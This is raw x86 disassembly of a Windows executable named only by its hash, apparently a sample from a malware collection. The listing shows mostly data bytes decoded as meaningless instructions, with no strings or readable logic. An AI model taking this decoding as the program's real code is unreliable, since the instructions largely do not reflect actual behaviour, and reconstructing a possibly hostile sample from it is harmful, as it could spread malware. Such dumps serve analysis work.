
aae405b76324f8feef9dd73d4d9cd88bd5e5f5242303a785caff01a24511792f.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	inc    eax
  402001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x536400,al
  402013:	add    BYTE PTR [eax+0x51],ch
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	pop    edi
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	push   0xf9000044
  402025:	push   cs
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    ch,dl
  402051:	dec    edi
  402052:	jge    0x401ff7
  402054:	imul   esi,esp,0xffffffd7
  402057:	adc    eax,0x2285bd5d
  40205c:	jle    0x40204e
  40205e:	xchg   esi,eax
  40205f:	cmp    BYTE PTR [esi],al
  402061:	fistp  DWORD PTR [eax+0x417939bc]
  402067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402068:	js     0x40208b
  40206a:	jbe    0x401fed
  40206c:	cs js  0x4020bf
  40206f:	pusha  
  402070:	pop    esp
  402071:	es jge 0x402055
  402074:	mov    ds:0x8b2f27de,al
  402079:	or     ebx,DWORD PTR [ecx-0x42]
  40207c:	inc    edx
  40207d:	ficom  WORD PTR [ebp-0x78]
  402080:	lods   al,BYTE PTR ds:[esi]
  402081:	cwde   
  402082:	(bad)  
  402084:	nop
  402085:	gs mov edx,edi
  402088:	aas    
  402089:	fst    DWORD PTR es:[ecx-0x18]
  40208d:	pushf  
  40208e:	pop    esp
  40208f:	or     eax,0x5b51290c
  402094:	pusha  
  402095:	add    eax,0x35329e58
  40209a:	lods   eax,DWORD PTR ds:[esi]
  40209b:	fs std 
  40209d:	call   DWORD PTR [ebx+0x22]
  4020a0:	dec    ecx
  4020a1:	pop    esi
  4020a2:	mov    esi,DWORD PTR [ebx+0x64]
  4020a5:	ret    0xd3fe
  4020a8:	xchg   DWORD PTR [ebx-0x57074e93],esi
  4020ae:	int3   
  4020af:	ins    BYTE PTR es:[edi],dx
  4020b0:	jecxz  0x402038
  4020b2:	or     DWORD PTR ds:0x154a18fb,edi
  4020b8:	xchg   edx,eax
  4020b9:	xchg   esp,eax
  4020ba:	test   al,0x49
  4020bc:	dec    ebx
  4020bd:	push   0x2e3ca3e8
  4020c2:	loop   0x402111
  4020c4:	pop    edi
  4020c5:	push   0x49331c02
  4020ca:	icebp  
  4020cb:	dec    ebx
  4020cc:	or     ebp,esi
  4020ce:	jae    0x40209d
  4020d0:	jl     0x402099
  4020d2:	jno    0x402088
  4020d4:	iret   
  4020d5:	les    eax,FWORD PTR [edx]
  4020d7:	mov    ds:0x614cda59,al
  4020dc:	add    al,0xf0
  4020de:	add    al,0x7c
  4020e0:	mov    edx,es
  4020e2:	mov    edi,0xcdc66522
  4020e7:	imul   ebx,DWORD PTR [edx],0x5b19c311
  4020ed:	or     eax,0x1c586380
  4020f2:	jns    0x402149
  4020f4:	mov    ebp,0xe36d741
  4020f9:	sbb    al,0x3f
  4020fb:	in     al,0x81
  4020fd:	imul   edx,DWORD PTR [eax],0xffffffa1
  402100:	cmc    
  402101:	mov    esi,0x47a8b64a
  402106:	or     BYTE PTR [ebp+0x67db29e1],0x3f
  40210d:	pop    ds
  40210e:	sbb    ah,BYTE PTR [ebp+0x4ab5329d]
  402114:	push   esi
  402115:	cmp    ebx,esi
  402117:	add    eax,0x854f7337
  40211c:	cdq    
  40211d:	lods   al,BYTE PTR ds:[esi]
  40211e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40211f:	cwde   
  402120:	cwde   
  402121:	mov    eax,ds:0x253def37
  402126:	std    
  402127:	mov    edi,0x8d95c37b
  40212c:	pop    DWORD PTR [ecx]
  40212e:	frstor [ebp+0x3]
  402131:	sar    DWORD PTR [esi+esi*1],cl
  402134:	xchg   esp,eax
  402135:	jg     0x4020de
  402137:	mov    bl,0x43
  402139:	mov    dh,0x9d
  40213b:	pop    eax
  40213c:	scas   al,BYTE PTR es:[edi]
  40213d:	mov    edx,0xaa458c60
  402142:	mov    ds:0x24495cc2,eax
  402147:	pop    ecx
  402148:	mov    bh,0xa1
  40214a:	cmp    BYTE PTR [ebx-0x11],dl
  40214d:	sbb    eax,0x21e3bd8
  402152:	sub    BYTE PTR [esi],dl
  402154:	add    BYTE PTR [eax],al
  402156:	or     ch,BYTE PTR [edx]
  402158:	sbb    esi,DWORD PTR [eax]
  40215a:	add    eax,0x1b000
  40215f:	add    BYTE PTR [ecx],al
  402161:	add    BYTE PTR [eax],al
  402163:	adc    DWORD PTR [edx],eax
  402165:	add    ebp,DWORD PTR [edi+0x32]
  402168:	add    BYTE PTR [eax],al
  40216a:	push   es
  40216b:	jge    0x402172
  40216d:	add    BYTE PTR [eax],al
  40216f:	add    al,0x2
  402171:	jb     0x402174
  402173:	add    BYTE PTR [eax],al
  402175:	jo     0x40218e
  402177:	lea    eax,[ecx]
  402179:	add    BYTE PTR [eax],al
  40217b:	add    DWORD PTR [ebx],edx
  40217d:	or     BYTE PTR [ecx],dl
  40217f:	or     BYTE PTR [esi],dl
  402181:	add    ebp,DWORD PTR [edi+0x27]
  402184:	add    BYTE PTR [eax],al
  402186:	push   es
  402187:	outs   dx,DWORD PTR ds:[esi]
  402188:	pop    ss
  402189:	add    BYTE PTR [eax],al
  40218b:	or     ah,BYTE PTR [edx+0x22280811]
  402191:	add    BYTE PTR [eax],al
  402193:	push   es
  402194:	add    al,BYTE PTR [ebx]
  402196:	outs   dx,DWORD PTR ds:[esi]
  402197:	daa    
  402198:	add    BYTE PTR [eax],al
  40219a:	push   es
  40219b:	jae    0x4021b5
  40219d:	add    BYTE PTR [eax],al
  40219f:	or     ch,BYTE PTR [eax]
  4021a1:	add    eax,DWORD PTR [eax]
  4021a3:	add    BYTE PTR [esi],al
  4021a5:	or     dh,BYTE PTR [ebx+0x19]
  4021a8:	add    BYTE PTR [eax],al
  4021aa:	or     cl,BYTE PTR [ebx]
  4021ac:	add    al,BYTE PTR [ebx]
  4021ae:	sub    BYTE PTR [esi],dl
  4021b0:	add    BYTE PTR [eax],al
  4021b2:	push   es
  4021b3:	or     al,0x7
  4021b5:	outs   dx,DWORD PTR ds:[esi]
  4021b6:	sbb    al,BYTE PTR [eax]
  4021b8:	add    BYTE PTR [edx],cl
  4021ba:	or     BYTE PTR [edi+0x1b],ch
  4021bd:	add    BYTE PTR [eax],al
  4021bf:	or     ah,BYTE PTR [esi]
  4021c1:	push   es
  4021c2:	outs   dx,DWORD PTR ds:[esi]
  4021c3:	sbb    al,0x0
  4021c5:	add    BYTE PTR [edx],cl
  4021c7:	adc    ecx,DWORD PTR [ecx]
  4021c9:	sub    ebp,DWORD PTR [edi]
  4021cb:	adc    cl,BYTE PTR [ecx]
  4021cd:	sub    BYTE PTR ds:0xd0a0000,bl
  4021d3:	add    dh,BYTE PTR [edx+0x37]
  4021d6:	add    BYTE PTR [eax],al
  4021d8:	jo     0x4021f1
  4021da:	lea    eax,[ecx]
  4021dc:	add    BYTE PTR [eax],al
  4021de:	add    DWORD PTR [ebx],edx
  4021e0:	or     dl,BYTE PTR [ecx]
  4021e2:	or     dl,BYTE PTR [esi]
  4021e4:	or     DWORD PTR [edi+0x1e],ebp
  4021e7:	add    BYTE PTR [eax],al
  4021e9:	or     ah,BYTE PTR [edx+0x22280a11]
  4021ef:	add    BYTE PTR [eax],al
  4021f1:	push   es
  4021f2:	add    cl,BYTE PTR [eax]
  4021f4:	or     DWORD PTR [eax],ebp
  4021f6:	pop    es
  4021f7:	add    BYTE PTR [eax],al
  4021f9:	push   es
  4021fa:	adc    cl,BYTE PTR [ecx]
  4021fc:	sub    BYTE PTR [edi],bl
  4021fe:	add    BYTE PTR [eax],al
  402200:	or     ch,BYTE PTR ds:0x120edec8
  402206:	or     esi,edi
  402208:	push   ss
  402209:	add    eax,DWORD PTR [eax]
  40220b:	add    BYTE PTR [ebx],bl
  40220d:	outs   dx,DWORD PTR ds:[esi]
  40220e:	and    BYTE PTR [eax],al
  402210:	add    BYTE PTR [edx],cl
  402212:	fadd   QWORD PTR [edx]
  402214:	pop    es
  402215:	add    ebp,DWORD PTR [edi+0x2a]
  402218:	add    BYTE PTR [eax],al
  40221a:	push   es
  40221b:	add    al,BYTE PTR [ebx]
  40221d:	outs   dx,DWORD PTR ds:[esi]
  40221e:	daa    
  40221f:	add    BYTE PTR [eax],al
  402221:	push   es
  402222:	sub    BYTE PTR [ebx],dl
  402224:	add    BYTE PTR [eax],al
  402226:	push   es
  402227:	add    ebp,DWORD PTR [edi+0x28]
  40222a:	add    BYTE PTR [eax],al
  40222c:	push   es
  40222d:	sub    BYTE PTR [eax+eax*1],ah
  402230:	add    BYTE PTR [esi],al
  402232:	add    al,BYTE PTR [ebx]
  402234:	outs   dx,DWORD PTR ds:[esi]
  402235:	daa    
  402236:	add    BYTE PTR [eax],al
  402238:	push   es
  402239:	jae    0x402253
  40223b:	add    BYTE PTR [eax],al
  40223d:	or     ch,BYTE PTR [eax]
  40223f:	adc    al,0x0
  402241:	add    BYTE PTR [esi],al
  402243:	adc    eax,DWORD PTR [ebx+esi*2]
  402246:	sbb    DWORD PTR [eax],eax
  402248:	add    BYTE PTR [edx],cl
  40224a:	adc    eax,DWORD PTR ds:0x16280302
  402250:	add    BYTE PTR [eax],al
  402252:	push   es
  402253:	adc    eax,DWORD PTR [esi]
  402255:	adc    DWORD PTR ds:0x1a6f,eax
  40225b:	or     dl,BYTE PTR [ecx]
  40225d:	push   es
  40225e:	outs   dx,DWORD PTR ds:[esi]
  40225f:	sbb    eax,DWORD PTR [eax]
  402261:	add    BYTE PTR [edx],cl
  402263:	adc    DWORD PTR es:[edi+ebp*2],eax
  402267:	and    DWORD PTR [eax],eax
  402269:	add    BYTE PTR [edx],cl
  40226b:	adc    ecx,DWORD PTR [ebx]
  40226d:	sub    ebp,DWORD PTR [ebx+0x12]
  402270:	or     ebp,DWORD PTR [eax]
  402272:	and    al,BYTE PTR [eax]
  402274:	add    BYTE PTR [edx],cl
  402276:	adc    eax,DWORD PTR [edi]
  402278:	add    dl,BYTE PTR [ecx]
  40227a:	pop    es
  40227b:	sub    BYTE PTR [edi],dl
  40227d:	add    BYTE PTR [eax],al
  40227f:	push   es
  402280:	sub    eax,0x7f720222
  402285:	add    BYTE PTR [eax],al
  402287:	jo     0x4022a0
  402289:	lea    eax,[ecx]
  40228b:	add    BYTE PTR [eax],al
  40228d:	add    DWORD PTR [ebx],edx
  40228f:	or     al,0x11
  402291:	or     al,0x16
  402293:	adc    DWORD PTR [edi],eax
  402295:	outs   dx,DWORD PTR ds:[esi]
  402296:	push   ds
  402297:	add    BYTE PTR [eax],al
  402299:	or     ah,BYTE PTR [edx+0x23280c11]
  40229f:	add    BYTE PTR [eax],al
  4022a1:	push   es
  4022a2:	sub    esi,DWORD PTR [esi]
  4022a4:	add    dh,BYTE PTR [edx-0x21]
  4022a7:	add    BYTE PTR [eax],al
  4022a9:	jo     0x4022c2
  4022ab:	lea    eax,[ecx]
  4022ad:	add    BYTE PTR [eax],al
  4022af:	add    DWORD PTR [ebx],edx
  4022b1:	or     eax,0x11160d11
  4022b6:	pop    es
  4022b7:	outs   dx,DWORD PTR ds:[esi]
  4022b8:	push   ds
  4022b9:	add    BYTE PTR [eax],al
  4022bb:	or     ah,BYTE PTR [edx+0x22280d11]
  4022c1:	add    BYTE PTR [eax],al
  4022c3:	push   es
  4022c4:	add    dl,BYTE PTR [ecx]
  4022c6:	push   es
  4022c7:	adc    DWORD PTR [edi],eax
  4022c9:	add    ebp,DWORD PTR [edi+0x2e]
  4022cc:	add    BYTE PTR [eax],al
  4022ce:	push   es
  4022cf:	add    ebp,DWORD PTR [edi+0x30]
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	push   es
  4022d5:	sub    BYTE PTR [eax],bl
  4022d7:	add    BYTE PTR [eax],al
  4022d9:	push   es
  4022da:	adc    cl,BYTE PTR [ebx]
  4022dc:	sub    BYTE PTR [ebx],ah
  4022de:	add    BYTE PTR [eax],al
  4022e0:	or     ch,BYTE PTR ds:0x120ede8c
  4022e6:	or     edi,esi
  4022e8:	push   ss
  4022e9:	add    eax,0x6f1b0000
  4022ee:	and    BYTE PTR [eax],al
  4022f0:	add    BYTE PTR [edx],cl
  4022f2:	fadd   QWORD PTR [edx]
  4022f4:	adc    DWORD PTR ds:0x2a6f03,eax
  4022fa:	add    BYTE PTR [esi],al
  4022fc:	add    al,BYTE PTR [ebx]
  4022fe:	outs   dx,DWORD PTR ds:[esi]
  4022ff:	daa    
  402300:	add    BYTE PTR [eax],al
  402302:	push   es
  402303:	sub    BYTE PTR [ecx],ah
  402305:	add    BYTE PTR [eax],al
  402307:	push   es
  402308:	add    ebp,DWORD PTR [edi+0x28]
  40230b:	add    BYTE PTR [eax],al
  40230d:	push   es
  40230e:	sub    BYTE PTR [eax+eax*1],ah
  402311:	add    BYTE PTR [esi],al
  402313:	sub    al,BYTE PTR [ecx]
  402315:	sbb    al,0x0
  402317:	add    BYTE PTR [edx],al
  402319:	add    BYTE PTR [ebp+0x0],ah
  40231c:	cmp    al,0xa1
  40231e:	add    BYTE PTR [esi],cl
  402320:	add    BYTE PTR [eax],al
  402322:	add    BYTE PTR [eax],al
  402324:	add    al,BYTE PTR [eax]
  402326:	or     DWORD PTR [ecx],eax
  402328:	js     0x4022ab
  40232a:	add    DWORD PTR [esi],ecx
  40232c:	add    BYTE PTR [eax],al
  40232e:	add    BYTE PTR [eax],al
  402330:	sbb    esi,DWORD PTR [eax]
  402332:	add    al,0x0
  402334:	test   eax,0x2000000
  402339:	add    BYTE PTR [eax],al
  40233b:	adc    DWORD PTR [ebx+0x24],esi
  40233e:	add    BYTE PTR [eax],al
  402340:	or     cl,BYTE PTR [edx]
  402342:	add    al,0x6f
  402344:	and    eax,0x160a0000
  402349:	xor    DWORD PTR [esp+eax*1+0x6f],ebx
  40234d:	add    BYTE PTR es:[eax],al
  402350:	or     dl,BYTE PTR [ebx]
  402352:	push   es
  402353:	sub    edi,DWORD PTR [ecx]
  402355:	adc    al,BYTE PTR [esi]
  402357:	sub    BYTE PTR [edi],ah
  402359:	add    BYTE PTR [eax],al
  40235b:	or     cl,BYTE PTR [ebx]
  40235d:	add    eax,DWORD PTR [edi]
  40235f:	push   ds
  402360:	and    BYTE PTR [ecx+eax*1],dl
  402363:	add    BYTE PTR [eax],al
  402365:	outs   dx,DWORD PTR ds:[esi]
  402366:	sub    BYTE PTR [eax],al
  402368:	add    BYTE PTR [edx],cl
  40236a:	or     al,0x8
  40236c:	sub    al,0x20
  40236e:	or     BYTE PTR [esi+0x1a311669],cl
  402374:	or     BYTE PTR [edx],al
  402376:	inc    BYTE PTR [esi]
  402378:	add    al,0x0
  40237a:	add    BYTE PTR [esi],al
  40237c:	jae    0x4023a7
  40237e:	add    BYTE PTR [eax],al
  402380:	or     ch,BYTE PTR [eax]
  402382:	add    DWORD PTR [eax],eax
  402384:	add    BYTE PTR [ebx],ch
  402386:	or     eax,0x2b6f0906
  40238b:	add    BYTE PTR [eax],al
  40238d:	or     dl,BYTE PTR [edx]
  40238f:	push   es
  402390:	sub    BYTE PTR [eax+eax*1],ch
  402393:	add    BYTE PTR [edx],cl
  402395:	sub    eax,0x124adebe
  40239a:	push   es
  40239b:	(bad)  
  40239c:	push   ss
  40239d:	push   es
  40239e:	add    BYTE PTR [eax],al
  4023a0:	sbb    ebp,DWORD PTR [edi+0x20]
  4023a3:	add    BYTE PTR [eax],al
  4023a5:	or     bl,ah
  4023a7:	add    esp,DWORD PTR [eax]
  4023a9:	adc    al,0x1
  4023ab:	add    BYTE PTR [eax],al
  4023ad:	outs   dx,DWORD PTR ds:[esi]
  4023ae:	sub    eax,0x130a0000
  4023b3:	add    al,0x11
  4023b5:	add    al,0x13
  4023b7:	pop    es
  4023b8:	push   ss
  4023b9:	adc    ecx,DWORD PTR [eax]
  4023bb:	sub    ebx,DWORD PTR [esi]
  4023bd:	adc    DWORD PTR [edi],eax
  4023bf:	adc    DWORD PTR [eax],ecx
  4023c1:	call   0x2e6f:0x5110513
  4023c8:	add    BYTE PTR [eax],al
  4023ca:	or     ch,BYTE PTR ds:0x5110608
  4023d0:	outs   dx,DWORD PTR ds:[esi]
  4023d1:	das    
  4023d2:	add    BYTE PTR [eax],al
  4023d4:	or     dl,BYTE PTR [ecx]
  4023d6:	or     BYTE PTR [edi],dl
  4023d8:	pop    eax
  4023d9:	adc    ecx,DWORD PTR [eax]
  4023db:	adc    DWORD PTR [eax],ecx
  4023dd:	adc    DWORD PTR [edi],eax
  4023df:	mov    gs,WORD PTR [ecx+0x32]
  4023e2:	fiadd  DWORD PTR [esi]
  4023e4:	sub    al,BYTE PTR [eax]
  4023e6:	add    BYTE PTR [eax],al
  4023e8:	add    DWORD PTR [eax],edx
  4023ea:	add    BYTE PTR [eax],al
  4023ec:	add    al,BYTE PTR [eax]
  4023ee:	pop    ss
  4023ef:	add    BYTE PTR [esi+0x5d],al
  4023f2:	add    BYTE PTR [esi],cl
  4023f4:	add    BYTE PTR [eax],al
  4023f6:	add    BYTE PTR [eax],al
  4023f8:	adc    esi,DWORD PTR [eax]
  4023fa:	add    eax,0x5900
  4023ff:	add    BYTE PTR [ebx],al
  402401:	add    BYTE PTR [eax],al
  402403:	adc    DWORD PTR [ebx],eax
  402405:	jne    0x40240c
  402407:	add    BYTE PTR [eax],al
  402409:	add    DWORD PTR [edx],ecx
  40240b:	push   es
  40240c:	adc    al,0x28
  40240e:	xor    BYTE PTR [eax],al
  402410:	add    BYTE PTR [edx],cl
  402412:	sub    al,0x47
  402414:	add    dh,BYTE PTR [edx+0x21]
  402417:	add    DWORD PTR [eax],eax
  402419:	jo     0x402432
  40241b:	lea    eax,[ecx]
  40241d:	add    BYTE PTR [eax],al
  40241f:	add    DWORD PTR [ebx],ecx
  402421:	pop    es
  402422:	push   ss
  402423:	add    ebp,DWORD PTR [edi+0x1e]
  402426:	add    BYTE PTR [eax],al
  402428:	or     ah,BYTE PTR [edx+0x232807]
  40242e:	add    BYTE PTR [esi],al
  402430:	sub    BYTE PTR [ecx],dh
  402432:	add    BYTE PTR [eax],al
  402434:	or     dh,BYTE PTR [edx-0x44]
  402437:	add    DWORD PTR [eax],eax
  402439:	jo     0x402452
  40243b:	lea    eax,[ecx]
  40243d:	add    BYTE PTR [eax],al
  40243f:	add    DWORD PTR [eax+ecx*1],ecx
  402442:	push   ss
  402443:	add    ebp,DWORD PTR [edi+0x1e]
  402446:	add    BYTE PTR [eax],al
  402448:	or     ah,BYTE PTR [edx+0x322808]
  40244e:	add    BYTE PTR [edx],cl
  402450:	jb     0x402464
  402452:	add    al,BYTE PTR [eax]
  402454:	jo     0x4024c9
  402456:	xor    eax,DWORD PTR [eax]
  402458:	add    BYTE PTR [edx],cl
  40245a:	jp     0x402462
  40245c:	sub    al,BYTE PTR [eax]
  40245e:	add    BYTE PTR [eax],al
  402460:	add    esi,DWORD PTR [eax]
  402462:	add    al,BYTE PTR [eax]
  402464:	mov    ebx,0x0
  402469:	add    BYTE PTR [eax],al
  40246b:	add    BYTE PTR [ebx],al
  40246d:	outs   dx,DWORD PTR ds:[esi]
  40246e:	xor    al,0x0
  402470:	add    BYTE PTR [edx],cl
  402472:	sar    BYTE PTR [edx],1
  402474:	add    BYTE PTR [eax],al
  402476:	add    DWORD PTR [eax],ebp
  402478:	xor    eax,0x6f0a0000
  40247d:	add    BYTE PTR ss:[eax],al
  402480:	or     dh,BYTE PTR [ebx+0x37]
  402483:	add    BYTE PTR [eax],al
  402485:	or     ch,BYTE PTR [edi+0x38]
  402488:	add    BYTE PTR [eax],al
  40248a:	or     al,BYTE PTR [ebx]
  40248c:	outs   dx,DWORD PTR ds:[esi]
  40248d:	xor    al,0x0
  40248f:	add    BYTE PTR [edx],cl
  402491:	sar    BYTE PTR ds:0x28010000,1
  402497:	xor    eax,0x6f0a0000
  40249c:	add    BYTE PTR ss:[eax],al
  40249f:	or     dh,BYTE PTR [ebx+0x37]
  4024a2:	add    BYTE PTR [eax],al
  4024a4:	or     ch,BYTE PTR [edi+0x38]
  4024a7:	add    BYTE PTR [eax],al
  4024a9:	or     al,BYTE PTR [ebx]
  4024ab:	outs   dx,DWORD PTR ds:[esi]
  4024ac:	xor    al,0x0
  4024ae:	add    BYTE PTR [edx],cl
  4024b0:	sar    BYTE PTR [esi],1
  4024b2:	add    BYTE PTR [eax],al
  4024b4:	add    DWORD PTR [eax],ebp
  4024b6:	xor    eax,0x6f0a0000
  4024bb:	add    BYTE PTR ss:[eax],al
  4024be:	or     dh,BYTE PTR [ebx+0x37]
  4024c1:	add    BYTE PTR [eax],al
  4024c3:	or     ch,BYTE PTR [edi+0x38]
  4024c6:	add    BYTE PTR [eax],al
  4024c8:	or     al,BYTE PTR [ebx]
  4024ca:	outs   dx,DWORD PTR ds:[esi]
  4024cb:	xor    al,0x0
  4024cd:	add    BYTE PTR [edx],cl
  4024cf:	sar    BYTE PTR [edi],1
  4024d1:	add    BYTE PTR [eax],al
  4024d3:	add    DWORD PTR [eax],ebp
  4024d5:	xor    eax,0x6f0a0000
  4024da:	add    BYTE PTR ss:[eax],al
  4024dd:	or     dh,BYTE PTR [ebx+0x37]
  4024e0:	add    BYTE PTR [eax],al
  4024e2:	or     ch,BYTE PTR [edi+0x38]
  4024e5:	add    BYTE PTR [eax],al
  4024e7:	or     al,BYTE PTR [ebx]
  4024e9:	outs   dx,DWORD PTR ds:[esi]
  4024ea:	xor    al,0x0
  4024ec:	add    BYTE PTR [edx],cl
  4024ee:	rol    BYTE PTR [eax+0x0],1
  4024f1:	add    BYTE PTR [ecx],al
  4024f3:	sub    BYTE PTR ds:0x6f0a0000,dh
  4024f9:	add    BYTE PTR ss:[eax],al
  4024fc:	or     dh,BYTE PTR [ebx+0x37]
  4024ff:	add    BYTE PTR [eax],al
  402501:	or     ch,BYTE PTR [edi+0x38]
  402504:	add    BYTE PTR [eax],al
  402506:	or     al,BYTE PTR [ebx]
  402508:	outs   dx,DWORD PTR ds:[esi]
  402509:	xor    al,0x0
  40250b:	add    BYTE PTR [edx],cl
  40250d:	rol    BYTE PTR [ecx+0x0],1
  402510:	add    BYTE PTR [ecx],al
  402512:	sub    BYTE PTR ds:0x6f0a0000,dh
  402518:	add    BYTE PTR ss:[eax],al
  40251b:	or     dh,BYTE PTR [ebx+0x37]
  40251e:	add    BYTE PTR [eax],al
  402520:	or     ch,BYTE PTR [edi+0x38]
  402523:	add    BYTE PTR [eax],al
  402525:	or     ch,BYTE PTR [edx]
  402527:	add    BYTE PTR [ebx],dl
  402529:	xor    BYTE PTR [eax+eax*1],al
  40252c:	xor    DWORD PTR [eax],eax
  40252e:	add    BYTE PTR [eax],al
  402530:	add    al,0x0
  402532:	add    BYTE PTR [ecx],dl
  402534:	jae    0x40256f
  402536:	add    BYTE PTR [eax],al
  402538:	or     cl,BYTE PTR [edx]
  40253a:	push   es
  40253b:	and    BYTE PTR [eax],al
  40253d:	pusha  
  40253e:	add    BYTE PTR [eax],al
  402540:	outs   dx,DWORD PTR ds:[esi]
  402541:	cmp    al,BYTE PTR [eax]
  402543:	add    BYTE PTR [edx],cl
  402545:	add    ebp,DWORD PTR [edi+0x3b]
  402548:	add    BYTE PTR [eax],al
  40254a:	or     al,BYTE PTR [esi]
  40254c:	outs   dx,DWORD PTR ds:[esi]
  40254d:	cmp    al,0x0
  40254f:	add    BYTE PTR [edx],cl
  402551:	add    al,BYTE PTR es:[ebx]
  402554:	push   es
  402555:	add    al,0x28
  402557:	or     al,0x0
  402559:	add    BYTE PTR [esi],al
  40255b:	add    al,BYTE PTR [ebx]
  40255d:	push   es
  40255e:	add    al,0x28
  402560:	or     eax,0x2a060000
  402565:	add    BYTE PTR [eax],al
  402567:	add    BYTE PTR [ebx],dl
  402569:	xor    BYTE PTR [edi],al
  40256b:	add    BYTE PTR [edi+0x5000001],ch
  402571:	add    BYTE PTR [eax],al
  402573:	adc    DWORD PTR [ebx+0x3d],esi
  402576:	add    BYTE PTR [eax],al
  402578:	or     cl,BYTE PTR [edx]
  40257a:	push   es
  40257b:	add    al,0x6f
  40257d:	push   ds
  40257e:	add    BYTE PTR [eax],al
  402580:	or     ch,BYTE PTR [edi+0x3e]
  402583:	add    BYTE PTR [eax],al
  402585:	or     al,BYTE PTR [esi]
  402587:	pop    ss
  402588:	outs   dx,DWORD PTR ds:[esi]
  402589:	aas    
  40258a:	add    BYTE PTR [eax],al
  40258c:	or     al,BYTE PTR [esi]
  40258e:	pop    ss
  40258f:	outs   dx,DWORD PTR ds:[esi]
  402590:	inc    eax
  402591:	add    BYTE PTR [eax],al
  402593:	or     al,BYTE PTR [esi]
  402595:	outs   dx,DWORD PTR ds:[esi]
  402596:	inc    ecx
  402597:	add    BYTE PTR [eax],al
  402599:	or     dl,al
  40259b:	add    BYTE PTR ds:[eax],al
  40259e:	add    DWORD PTR [eax],ebp
  4025a0:	xor    eax,0x6f0a0000
  4025a5:	push   ds
  4025a6:	add    BYTE PTR [eax],al
  4025a8:	or     ch,BYTE PTR [edi+0x42]
  4025ab:	add    BYTE PTR [eax],al
  4025ad:	or     al,BYTE PTR [edx]
  4025af:	push   es
  4025b0:	sub    BYTE PTR [eax],ah
  4025b2:	add    BYTE PTR [eax],al
  4025b4:	push   es
  4025b5:	add    al,BYTE PTR [esi]
  4025b7:	add    al,0x28
  4025b9:	push   es
  4025ba:	add    BYTE PTR [eax],al
  4025bc:	push   es
  4025bd:	add    ch,BYTE PTR [eax]
  4025bf:	or     DWORD PTR [eax],eax
  4025c1:	add    BYTE PTR [esi],al
  4025c3:	or     eax,DWORD PTR [edx]
  4025c5:	sub    BYTE PTR [edx],cl
  4025c7:	add    BYTE PTR [eax],al
  4025c9:	push   es
  4025ca:	or     al,0x16
  4025cc:	or     eax,0x436f04
  4025d1:	add    BYTE PTR [edx],cl
  4025d3:	adc    ecx,DWORD PTR [eax]
  4025d5:	push   ss
  4025d6:	adc    ecx,DWORD PTR [ecx]
  4025d8:	cmp    BYTE PTR [ecx+eax*1],al
  4025db:	add    BYTE PTR [eax],al
  4025dd:	adc    DWORD PTR [eax],ecx
  4025df:	adc    DWORD PTR [ecx],ecx
  4025e1:	call   0x6f04:0x11020413
  4025e8:	inc    esp
  4025e9:	add    BYTE PTR [eax],al
  4025eb:	or     ch,BYTE PTR [eax]
  4025ed:	sldt   WORD PTR [eax]
  4025f0:	push   es
  4025f1:	adc    eax,DWORD PTR ds:0x456f0411
  4025f7:	add    BYTE PTR [eax],al
  4025f9:	or     ch,BYTE PTR [edi+0x46]
  4025fc:	add    BYTE PTR [eax],al
  4025fe:	or     ch,BYTE PTR ds:0x6f041109
  402604:	inc    ebp
  402605:	add    BYTE PTR [eax],al
  402607:	or     ch,BYTE PTR [ebx]
  402609:	or     al,0x11
  40260b:	add    al,0x6f
  40260d:	inc    ebp
  40260e:	add    BYTE PTR [eax],al
  402610:	or     ch,BYTE PTR [edi+0x47]
  402613:	add    BYTE PTR [eax],al
  402615:	or     dl,BYTE PTR [ebx]
  402617:	push   es
  402618:	add    dl,BYTE PTR [ecx]
  40261a:	add    eax,0x6f060611
  40261f:	dec    eax
  402620:	add    BYTE PTR [eax],al
  402622:	or     ch,BYTE PTR [eax]
  402624:	adc    DWORD PTR [eax],eax
  402626:	add    BYTE PTR [esi],al
  402628:	adc    eax,DWORD PTR [edi]
  40262a:	push   es
  40262b:	outs   dx,DWORD PTR ds:[esi]
  40262c:	cmp    eax,DWORD PTR [eax]
  40262e:	add    BYTE PTR [edx],cl
  402630:	add    dl,BYTE PTR [ecx]
  402632:	add    eax,0x6f060611
  402637:	dec    eax
  402638:	add    BYTE PTR [eax],al
  40263a:	or     ch,BYTE PTR [eax]
  40263c:	adc    BYTE PTR [eax],al
  40263e:	add    BYTE PTR [esi],al
  402640:	outs   dx,DWORD PTR ds:[esi]
  402641:	cmp    al,0x0
  402643:	add    BYTE PTR [edx],cl
  402645:	es push es
  402647:	outs   dx,DWORD PTR ds:[esi]
  402648:	cmp    eax,DWORD PTR [eax]
  40264a:	add    BYTE PTR [edx],cl
  40264c:	adc    DWORD PTR [edi],eax
  40264e:	outs   dx,DWORD PTR ds:[esi]
  40264f:	cmp    al,0x0
  402651:	add    BYTE PTR [edx],cl
  402653:	es pop es
  402655:	outs   dx,DWORD PTR ds:[esi]
  402656:	dec    ecx
  402657:	add    BYTE PTR [eax],al
  402659:	or     al,BYTE PTR [edx]
  40265b:	adc    DWORD PTR [ecx+edx*1],eax
  40265e:	add    eax,0xe28
  402663:	push   es
  402664:	outs   dx,DWORD PTR ds:[esi]
  402665:	dec    edx
  402666:	add    BYTE PTR [eax],al
  402668:	or     ah,BYTE PTR [esi]
  40266a:	adc    DWORD PTR [edi+ebp*2],eax
  40266d:	inc    ebp
  40266e:	add    BYTE PTR [eax],al
  402670:	or     ch,BYTE PTR [edi+0x46]
  402673:	add    BYTE PTR [eax],al
  402675:	or     ch,BYTE PTR [ebx+eiz*2]
  402678:	or     BYTE PTR [edi+0x49],ch
  40267b:	add    BYTE PTR [eax],al
  40267d:	or     dh,BYTE PTR [ebx+0x4b]
  402680:	add    BYTE PTR [eax],al
